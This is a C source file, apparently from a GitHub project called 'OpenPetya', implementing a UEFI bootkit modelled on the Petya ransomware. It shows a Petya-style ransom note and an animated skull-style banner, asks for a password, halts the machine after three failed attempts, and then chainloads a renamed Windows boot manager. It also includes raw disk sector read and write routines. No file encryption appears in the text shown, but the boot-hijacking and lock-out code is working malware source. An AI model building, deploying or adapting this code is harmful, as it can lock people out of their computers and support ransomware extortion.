// petya.c
// Author: iss4cf0ng/ISSAC
// GitHub: https://github.com/iss4cf0ng/OpenPetya

#include <efi.h>
#include <efilib.h>
#include <string.h>

/*

Print(L"1: InitializeLib OK\r\n");
Print(L"2: EFI context assigned\r\n");
Print(L"3: Before uefi_print\r\n");

uefi_print("Hello from uefi_print()\n");

Print(L"4: After uefi_print\r\n");
Print(L"5: HEX = ");

uefi_print_hex(0x1234ABCD);

Print(L"\r\n");

Print(L"6: DEC = ");

uefi_print_dec(123456789);

Print(L"\r\n");

Print(L"7: Sleeping 1 second...\r\n");

uefi_sleep_ms(1000);

Print(L"8: Sleep OK\r\n");
Print(L"9: Before clear\r\n");

uefi_clear();

Print(L"10: After clear\r\n");
Print(L"11: Before set color\r\n");
uefi_set_color(EFI_WHITE, EFI_LIGHTRED);

Print(L"12: Set color OK\r\n");

char password[64];
Print(L"13: Enter password: ");
uefi_read_password(password, sizeof(password));

Print(L"14: Password input OK\r\n");
Print(L"15: Finding Block I/O...\r\n");

EFI_STATUS status = find_block_io(image);
if (EFI_ERROR(status))
{
    Print(L"16: Block I/O FAILED\r\n");
    uefi_print_hex((UINT32)status);
    Print(L"\r\n");

    while (1)
        g_bs->Stall(1000000);
}

Print(L"16: Block I/O OK\r\n");

Print(L"17: Media ID = ");
uefi_print_dec(g_media_id);
Print(L"\r\n");

UINT8 sector[512];
Print(L"18: Before ReadBlocks\r\n");

int read_result = uefi_read_sector(0, sector);
if (read_result != 0)
{
    Print(L"19: ReadBlocks FAILED\r\n");
    uefi_halt();
}

Print(L"19: ReadBlocks OK\r\n");

UINT8 test_sector[512];

for (int i = 0; i < 512; i++)
    test_sector[i] = (UINT8)(i & 0xFF);

Print(L"20: Before WriteBlocks\r\n");

int write_result = uefi_write_sector(10, test_sector);

if (write_result != 0)
{
    Print(L"21: WriteBlocks FAILED\r\n");
    uefi_halt();
}

Print(L"21: WriteBlocks OK\r\n");

UINT8 verify_sector[512];

Print(L"22: Before ReadBack\r\n");

if (uefi_read_sector(10, verify_sector) != 0)
{
    Print(L"23: ReadBack FAILED\r\n");
    uefi_halt();
}

Print(L"23: ReadBack OK\r\n");

int mismatch = 0;

for (int i = 0; i < 512; i++)
{
    if (verify_sector[i] != test_sector[i])
    {
        mismatch = 1;
        break;
    }
}

if (mismatch)
{
    Print(L"24: VERIFY FAILED\r\n");
    uefi_halt();
}

Print(L"24: WRITE/READ VERIFY OK\r\n");

int unlock_tag = 0;
if (unlock_tag)
{
    uefi_print("Unlock tag detected.\r\n");
    uefi_print("Booting original EFI...\r\n");

    status = chainload_original_efi(image);

    uefi_print("Chainload returned.\r\n");
    uefi_print("Status: ");
    uefi_print_hex((UINT32)status);
    uefi_print("\r\n");

    uefi_halt();
}

do_login();

chainload_original_efi(image);

*/

#define PASSWORD_HASH_SEED 2166136261UL
#define PASSWORD_HASH_PRIME 16777619UL

#define RANSOM_MSG \
"Ooops, your important files are encrypted.\n" \
"\n" \
"If you see this text, then your files are no longer accessible,\n" \
"because they have been encrypted. Perhaps you are busy looking for a way to\n" \
"recover your files, but don't waste your time.\n" \
"Nobody can recover your file without our decryption service.\n" \
"\n" \
"We guarantee that you can recover all your files safely and easily.\n" \
"All you need to do is the following:\n\n" \
"\t1. Visit my blog: https://iss4cf0ng.github.io\n" \
"\t2. Visit my GitHub: https://github.com/iss4cf0ng\n" \
"\t3. Ok... I don't have any idea what is next... enter your key!\n\n"

static EFI_SYSTEM_TABLE *g_st = NULL;
static EFI_BOOT_SERVICES *g_bs = NULL;
static EFI_RUNTIME_SERVICES *g_rs = NULL;
static EFI_BLOCK_IO_PROTOCOL *g_bio = NULL;
static UINT32 g_media_id = 0;

volatile UINT8 g_ExpectedPasswordHash[4] = {
    0xDE, 0xAD, 0xBE, 0xEF
};

static UINT32 password_hash(const char *password)
{
    UINT32 hash;
    UINTN i;

    hash = PASSWORD_HASH_SEED;

    if (password == NULL)
        return hash;

    for (i = 0; password[i] != '\0'; ++i)
    {
        hash ^= (UINT8)password[i];
        hash *= PASSWORD_HASH_PRIME;
    }

    return hash;
}

static EFI_STATUS find_block_io(EFI_HANDLE image)
{
    EFI_STATUS status;
    EFI_LOADED_IMAGE *loaded_image = NULL;

    status = uefi_call_wrapper(
        g_bs->HandleProtocol,
        3,
        image,
        &LoadedImageProtocol,
        (void **)&loaded_image
    );

    if (EFI_ERROR(status))
        return status;

    status = uefi_call_wrapper(
        g_bs->HandleProtocol,
        3,
        loaded_image->DeviceHandle,
        &BlockIoProtocol,
        (void **)&g_bio
    );

    if (EFI_ERROR(status))
    {
        g_bio = NULL;
        return status;
    }

    if (g_bio == NULL || g_bio->Media == NULL)
    {
        g_bio = NULL;
        return EFI_NOT_FOUND;
    }

    g_media_id = g_bio->Media->MediaId;

    return EFI_SUCCESS;
}

static int uefi_read_sector(UINT32 lba, void *buffer)
{
    if (g_bio == NULL || buffer == NULL)
        return -1;

    EFI_STATUS status = uefi_call_wrapper(
        g_bio->ReadBlocks,
        5,
        g_bio,
        g_media_id,
        (EFI_LBA)lba,
        512,
        buffer
    );

    return EFI_ERROR(status) ? -1 : 0;
}

static int uefi_write_sector(UINT32 lba, const void *buffer)
{
    if (g_bio == NULL || buffer == NULL)
        return -1;

    EFI_STATUS status = uefi_call_wrapper(
        g_bio->WriteBlocks,
        5,
        g_bio,
        g_media_id,
        (EFI_LBA)lba,
        512,
        (void *)buffer
    );

    return EFI_ERROR(status) ? -1 : 0;
}

void uefi_halt(void)
{
    while (1)
    {
        g_bs->Stall(1000000);
    }
}

void uefi_print(const char *s)
{
    if (s == NULL)
        return;

    while (*s)
    {
        char c = *s;
        if (c == '\n')
            Print(L"\r\n");
        else
        {
            CHAR16 tmp[2];

            tmp[0] = (CHAR16)(unsigned char)c;
            tmp[1] = L'\0';

            Print(tmp);
        }

        s++;
    }
}

void uefi_print_hex(UINT32 n)
{
    const char *hex = "0123456789ABCDEF";
    char buffer[11];

    buffer[0] = '0';
    buffer[1] = 'x';

    for (int i = 0; i < 8; i++)
    {
        buffer[9 - i] = hex[n & 0xF];
        n >>= 4;
    }

    buffer[10] = '\0';

    uefi_print(buffer);
}

void uefi_print_dec(UINT32 n)
{
    char buffer[11];
    int i = 0;

    if (n == 0)
    {
        uefi_print("0");
        return;
    }

    while (n > 0)
    {
        buffer[i++] = (char)('0' + (n % 10));
        n /= 10;
    }

    buffer[i] = '\0';

    for (int j = 0; j < i / 2; j++)
    {
        char tmp = buffer[j];

        buffer[j] = buffer[i - j - 1];
        buffer[i - j - 1] = tmp;
    }

    uefi_print(buffer);
}

void uefi_clear(void)
{
    uefi_call_wrapper(
        g_st->ConOut->ClearScreen,
        1,
        g_st->ConOut
    );
}

void uefi_read_password(char *buffer, int max_len)
{
    int i = 0;
    if (buffer == NULL || max_len <= 0)
        return;

    while (i < max_len - 1)
    {
        EFI_INPUT_KEY key;
        EFI_STATUS status;

        status = uefi_call_wrapper(
            g_bs->WaitForEvent,
            3,
            1,
            &g_st->ConIn->WaitForKey,
            NULL
        );

        if (EFI_ERROR(status))
            continue;

        status = uefi_call_wrapper(
            g_st->ConIn->ReadKeyStroke,
            2,
            g_st->ConIn,
            &key
        );

        if (EFI_ERROR(status))
            continue;

        if (key.UnicodeChar == L'\r')
        {
            uefi_print("\r\n");
            break;
        }

        if (key.UnicodeChar == L'\b')
        {
            if (i > 0)
            {
                i--;
                uefi_print("\b \b");
            }

            continue;
        }

        if (key.UnicodeChar < 32 || key.UnicodeChar > 126)
            continue;

        buffer[i++] = (char)key.UnicodeChar;
        
        uefi_print("*");
    }

    buffer[i] = '\0';
}

void uefi_set_color(UINTN fore_color, UINTN back_color)
{
    uefi_call_wrapper(
        g_st->ConOut->SetAttribute,
        2,
        g_st->ConOut,
        EFI_TEXT_ATTR(fore_color, back_color)
    );
}

void uefi_sleep_ms(UINTN ms)
{
    uefi_call_wrapper(g_bs->Stall, 1, ms * 1000);
}

void uefi_reboot(void)
{
    uefi_call_wrapper(
        g_rs->ResetSystem,
        4,
        EfiResetCold,
        EFI_SUCCESS,
        0,
        NULL
    );

    while (1)
        ;
}

int keyboard_hashkey(void)
{
    EFI_STATUS status;

    status = uefi_call_wrapper(
        g_bs->CheckEvent,
        1,
        g_st->ConIn->WaitForKey
    );

    return !EFI_ERROR(status);
}

void keyboard_consume_key(void)
{
    EFI_INPUT_KEY key;

    uefi_call_wrapper(
        g_st->ConIn->ReadKeyStroke,
        2,
        g_st->ConIn,
        &key
    );
}

static void uefi_print_centered(const CHAR16 *line1, const CHAR16 *line2)
{
    EFI_STATUS status;

    UINTN mode;
    UINTN columns;
    UINTN rows;

    UINTN len1 = StrLen(line1);
    UINTN len2 = StrLen(line2);

    mode = g_st->ConOut->Mode->Mode;

    status = uefi_call_wrapper(
        g_st->ConOut->QueryMode,
        4,
        g_st->ConOut,
        mode,
        &columns,
        &rows
    );

    if (EFI_ERROR(status))
        return;

    if (len1 < columns)
    {
        uefi_call_wrapper(
            g_st->ConOut->SetCursorPosition,
            3,
            g_st->ConOut,
            (columns - len1) / 2,
            rows / 2
        );

        Print(line1);
    }

    if (len2 < columns)
    {
        uefi_call_wrapper(
            g_st->ConOut->SetCursorPosition,
            3,
            g_st->ConOut,
            (columns - len2) / 2,
            rows / 2 + 1
        );

        Print(line2);
    }
}

static int check_password(const char *password)
{
    UINT32 hash;
    UINT32 expected;

    hash = password_hash(password);

    memcpy(
        &expected,
        g_ExpectedPasswordHash,
        sizeof(expected)
    );

    return hash == expected;
}

static void do_login(void)
{
    char input[65];
    int attempts = 0;

    uefi_clear();

    const CHAR16 *frames[] = {
        L"-==oo0[ NiHaHaHaHa >          ",
        L" -==oo0[ NiHaHaHaHa >         ",
        L"  -==oo0[ NiHaHaHaHa >        ",
        L"   -==oo0[ NiHaHaHaHa >       ",
        L"    -==oo0[ NiHaHaHaHa >      ",
        L"     -==oo0[ NiHaHaHaHa >     ",
        L"      -==oo0[ NiHaHaHaHa >    ",
        L"       -==oo0[ NiHaHaHaHa >   ",
        L"        -==oo0[ NiHaHaHaHa >  ",
        L"         -==oo0[ NiHaHaHaHa > ",
        L"          -==oo0[ NiHaHaHaHa >",
        L">          -==oo0[ NiHaHaHaHa ",
        L" >          -==oo0[ NiHaHaHaHa",
        L"a >          -==oo0[ NiHaHaHaH",
        L"Ha >          -==oo0[ NiHaHaHa",
        L"aHa >          -==oo0[ NiHaHaH",
        L"HaHa >          -==oo0[ NiHaHa",
        L"aHaHa >          -==oo0[ NiHaH",
        L"HaHaHa >          -==oo0[ NiHa",
        L"aHaHaHa >          -==oo0[ NiH",
        L"HaHaHaHa >          -==oo0[ Ni",
        L"iHaHaHaHa >          -==oo0[ N",
        L"NiHaHaHaHa >          -==oo0[ ",
        L" NiHaHaHaHa >          -==oo0[",
        L"[ NiHaHaHaHa >          -==oo0",
        L"0[ NiHaHaHaHa >          -==oo",
        L"o0[ NiHaHaHaHa >          -==o",
        L"oo0[ NiHaHaHaHa >          -==",
        L"=oo0[ NiHaHaHaHa >          -=",
        L"==oo0[ NiHaHaHaHa >          -",
    };

    int frame = 0;
    int frame_count = sizeof(frames) / sizeof(frames[0]);

    uefi_set_color(EFI_WHITE, EFI_RED);

    while (1)
    {
        uefi_clear();
        uefi_set_color(EFI_WHITE, EFI_RED);

        uefi_print_centered(
            frames[frame],
            L"(Press any key to resume)"
        );

        frame++;

        if (frame >= frame_count)
            frame = 0;

        if (keyboard_hashkey())
        {
            keyboard_consume_key();
            break;
        }

        uefi_sleep_ms(100);
    }

    uefi_set_color(EFI_WHITE, EFI_RED);

    uefi_sleep_ms(100);

    uefi_clear();
    
    uefi_print(RANSOM_MSG);

    while (attempts < 3)
    {
        uefi_print("Password: ");

        uefi_read_password(input, sizeof(input));

        if (check_password(input))
        {
            uefi_set_color(EFI_LIGHTGREEN, EFI_BLACK);
            uefi_clear();

            uefi_print("\r\nAccess granted!\r\n");
            uefi_set_color(EFI_WHITE, EFI_BLACK);

            return;
        }

        attempts++;

        uefi_print("\r\nWrong password.\r\n\r\n");
    }

    uefi_print("Too many attempts. Halting.\r\n");

    uefi_halt();
}

static EFI_STATUS chainload_original_efi(EFI_HANDLE image)
{
    EFI_STATUS status;

    EFI_LOADED_IMAGE *loaded = NULL;
    EFI_GUID lip_guid = EFI_LOADED_IMAGE_PROTOCOL_GUID;

    status = uefi_call_wrapper(
        g_st->BootServices->HandleProtocol,
        3,
        image,
        &lip_guid,
        (void **)&loaded
    );

    if (EFI_ERROR(status))
    {
        uefi_print("ERROR: HandleProtocol(LoadedImage) failed!\r\n");
        return status;
    }

    if (loaded == NULL || loaded->DeviceHandle == NULL)
    {
        uefi_print("ERROR: Invalid loaded image!\r\n");
        return EFI_NOT_FOUND;
    }

    CHAR16 *path =
        L"\\EFI\\Microsoft\\Boot\\bootmgfw_original.efi";

    EFI_DEVICE_PATH *device_path =
        FileDevicePath(
            loaded->DeviceHandle,
            path
        );

    if (device_path == NULL)
    {
        uefi_print("ERROR: FileDevicePath failed!\r\n");
        return EFI_OUT_OF_RESOURCES;
    }

    EFI_HANDLE new_image = NULL;

    status = uefi_call_wrapper(
        g_st->BootServices->LoadImage,
        6,
        FALSE,
        image,
        device_path,
        NULL,
        0,
        &new_image
    );

    FreePool(device_path);

    if (EFI_ERROR(status))
    {
        uefi_print("ERROR: Cannot load bootmgfw_original.efi!\r\n");
        return status;
    }

    uefi_print("Original EFI loaded.\r\n");
    uefi_print("Chainloading...\r\n");

    status = uefi_call_wrapper(
        g_st->BootServices->StartImage,
        3,
        new_image,
        NULL,
        NULL
    );

    if (EFI_ERROR(status))
    {
        uefi_print("ERROR: StartImage failed!\r\n");
        return status;
    }

    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI efi_main(EFI_HANDLE image, EFI_SYSTEM_TABLE *systab)
{
    InitializeLib(image, systab);

    g_st = systab;
    g_bs = systab->BootServices;
    g_rs = systab->RuntimeServices;

    do_login();
    chainload_original_efi(image);

    while (1)
        g_bs->Stall(1000000);

    return EFI_SUCCESS;
}